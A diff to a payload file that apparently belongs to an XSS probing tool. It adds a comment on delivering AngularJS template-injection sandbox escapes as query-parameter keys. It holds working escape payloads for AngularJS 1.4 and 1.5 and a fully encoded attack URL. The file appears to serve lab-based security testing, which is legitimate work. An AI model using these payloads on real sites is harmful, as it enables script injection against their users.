@@ -108,9 +108,20 @@ angular_csti:
   "1.5":
     - "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}"
 
-# AngularJS CSTI variant for when quotes are HTML-encoded near the reflection: this $parse-key
-# shape escapes the sandbox WITHOUT any string literal in the injected payload (it builds the
-# string via fromCharCode on char codes for "x=alert(1)"). Keyed by era like angular_csti.
+# AngularJS CSTI variant for the "$parse of a param KEY" sandbox-escape — no string literal in the
+# injected payload (it builds "x=alert(1)" via fromCharCode on its char codes). The lab client does
+# `key=<paramName>; $scope.query[key]=<paramValue>; $scope.value=$parse(key)($scope.query)`, so the
+# param NAME is the Angular expression that gets evaluated. These vectors are therefore delivered by
+# xss_probe AS A QUERY-PARAM KEY, not a value (see _build_angular_key_url in xss_probe_tools.py):
+#   GET <path>?<injected_param>=1&<EXPR_AS_KEY>=1
+# The stored vector is the bare expression WITH its trailing `=1` (the KEY→value separator) but
+# WITHOUT the `<injected_param>=1&` prefix and WITHOUT %3d encoding. At delivery the tool prefixes
+# `<param>=1&` and percent-encodes every INTERNAL `=` (e.g. the `charAt=` assignment) to `%3d` so it
+# stays inside the KEY, keeping the final `=1` as the separator and everything else RAW. Fully
+# delivered, the "1.4" vector becomes:
+#   ?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+# Keyed by era like angular_csti. (Keep storing the bare expression; one entry serves both the
+# value-delivery $parse-sink path and the key-delivery path.)
 angular_no_strings:
   "1.4":
     - 'toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1'
